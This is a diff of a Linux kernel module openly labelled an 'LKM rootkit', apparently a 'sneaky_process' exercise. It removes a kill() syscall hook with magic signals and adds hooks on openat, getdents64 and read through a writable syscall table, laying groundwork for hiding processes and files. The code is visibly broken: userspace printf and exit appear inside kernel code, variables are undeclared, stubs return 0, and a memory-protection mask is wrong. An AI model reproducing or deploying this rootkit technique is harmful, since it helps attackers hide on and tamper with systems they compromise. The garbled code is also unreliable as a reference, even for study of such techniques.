@@ -14,113 +14,34 @@
 #include <linux/version.h>
 #include <linux/dirent.h>      // Contains dirent structs etc
 
-/* Module Information*/
-//MODULE_LICENSE("GPL");
-MODULE_AUTHOR("jerry");
-MODULE_DESCRIPTION("LKM rootkit");
-MODULE_VERSION("0.0.1");
 
-//This is a pointer to the system call table
-static unsigned long * sys_call_table;
+#define _GNU_SOURCE
+#include <dirent.h>     /* Defines DT_* constants */
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
 
-#ifdef CONFIG_X86_64
-  #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
-    #define PTREGS_SYSCALL_STUB 1
-    typedef asmlinkage long (* ptregs_t)(const struct pt_regs * regs);
-    static ptregs_t orig_kill;
-  #else 
-    typedef asmlinkage long(* orig_kill_t)(pid_t pid, int sig);
-    static orig_kill_t orig_kill;
-  #endif
-#endif
-
-enum signals{
-  SIGSUPER = 64,
-  SIGINVIS = 63,
-};
-
-#if PTREGS_SYSCALL_STUB 
-  static asmlinkage long hack_kill(const struct pt_regs *regs){
-    int sig = regs ->si;
-    if(sig == SIGSUPER) {
-      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
-      return 0;
-    } else if(sig == SIGINVIS){
-      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
-      return 0;
-    }
-    return orig_kill(regs);
-  }
-#else
-
-static asmlinkage long hack_kill(pid_t pid, int sig){
-  int sig = regs ->si;
-    if(sig == SIGSUPER) {
-      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
-      return 0;
-    } else if(sig == SIGINVIS){
-      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
-      return 0;
-    }
-    return orig_kill(regs);
-}
-
-#endif
-
-static int cleanup(void){
-  /* kill */
-  sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-  return  0;
-  }
-
-static int store(void){
-  #if PTREGS_SYSCALL_STUB
-  /* kill */
-  orig_kill = (ptregs_t) sys_call_table[__NR_kill];
-  printk(KERN_INFO "orig_kill table entry successfully stored \n");
-  #else
-  /* kill */
-  orig_kill = (orig_kill_t) sys_call_table[__NR_kill];
-  printk(KERN_INFO "orig_kill table entry successfully stored \n");
-
-  #endif
-    return 0;
-}
-
-static int hook(void){
-  printk(KERN_INFO "hooked function");
-  /* kill */
-  sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
-
-
-  return 0;
-}
-
-static inline void
-write_cr0_forced(unsigned long val)
-{
-    unsigned long __force_order;
-
-    /* __asm__ __volatile__( */
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));
-}
-
-static void unprotect_memory(void){
-  write_cr0_forced(read_cr0() & (~ 0x10000));
-  printk(KERN_INFO "unprotected memory\n");
-}
-
-static void protect_memory(void){
-  write_cr0_forced(read_cr0() | (~ 0x10000));
-  printk(KERN_INFO "protected memory\n");
-}
-
-/////////////////////////////////////////////////////
 #define PREFIX "sneaky_process"
 
+#define handle_error(msg) \
+               do { perror(msg); exit(EXIT_FAILURE); } while (0)
 
+struct linux_dirent64 {
+               ino64_t        d_ino;    /* 64-bit inode number */
+               off64_t        d_off;    /* 64-bit offset to next structure */
+               unsigned short d_reclen; /* Size of this dirent */
+               unsigned char  d_type;   /* File type */
+               char           d_name[]; /* Filename (null-terminated) */
+           };
+
+
+
+//This is a pointer to the system call table
+static unsigned long *sys_call_table;
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -136,20 +57,59 @@ int enable_page_rw(void *ptr){
 int disable_page_rw(void *ptr){
   unsigned int level;
   pte_t *pte = lookup_address((unsigned long) ptr, &level);
-  pte->pte = pte->pte & ~_PAGE_RW;
+  pte->pte = pte->pte &~_PAGE_RW;
   return 0;
 }
 
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
-asmlinkage int (*original_openat)(struct pt_regs *);
+asmlinkage int (*original_openat)(int dirfd, const char *pathname, int flags);
+asmlinkage int (*original_getdents64)(int fd, void *dirp, size_t count);
+asmlinkage int (*original_read)(int fd, void *buf, size_t count);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  return (*original_openat)(regs);
+  //return (*original_openat)(regs);
+  return 0;
+
+}
+
+asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
+{
+  long nread;
+  // Implement the sneaky part here
+  nread = original_getdents64(fd, dirp, count);
+  if (nread == -1)
+    handle_error("getdents");
+  if (nread == 0)
+    return 0;
+
+  for(long bpos = 0; bpos < nread;){
+    d = (struct linux_dirent64 *) (buf + bpos);
+    printf("%8ld  ", d->d_ino);
+    d_type = *(buf + bpos + d->d_reclen - 1);
+    printf("%-10s ", (d_type == DT_REG) ?  "regular" :
+                    (d_type == DT_DIR) ?  "directory" :
+                    (d_type == DT_FIFO) ? "FIFO" :
+                    (d_type == DT_SOCK) ? "socket" :
+                    (d_type == DT_LNK) ?  "symlink" :
+                    (d_type == DT_BLK) ?  "block dev" :
+                    (d_type == DT_CHR) ?  "char dev" : "???");
+    printf("%4d %10jd  %s\n", d->d_reclen,
+            (intmax_t) d->d_off, d->d_name);
+    bpos += d->d_reclen;
+  }
+  return 0;
+}
+
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+{
+  // Implement the sneaky part here
+  //return (*original_read)(regs);
+  return 0;
 }
 
 // The code that gets executed when the module is loaded
@@ -162,35 +122,32 @@ static int initialize_sneaky_module(void)
   // This address will change after rebooting due to protection
   #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
     sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-  #else 
+  #else
     sys_call_table = NULL;
   #endif
 
-  if(! sys_call_table){
+  if(sys_call_table == 0){
     printk(KERN_INFO "error: sys_call_table == null");
     return err;
   }
+    
 
-  if(store() == err){
-    printk(KERN_INFO "error: store error \n");
-  }
-
-  unprotect_memory();
-  if(hook() == err){
-    printk(KERN_INFO "error: hook error\n");
-  }
-  protect_memory();
   // This is the magic! Save away the original 'openat' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
-  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-
   // You need to replace other system calls you need to hack here
+  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+
+
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -200,13 +157,8 @@ static int initialize_sneaky_module(void)
 
 
 static void exit_sneaky_module(void) 
-{ int err = 1;
+{
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
-  unprotect_memory();
-  if(cleanup() == err){
-    printk(KERN_INFO "error: cleanup error\n");
-  }
-  protect_memory();
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -214,6 +166,8 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
@@ -223,3 +177,5 @@ static void exit_sneaky_module(void)
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
 MODULE_LICENSE("GPL");
+
+
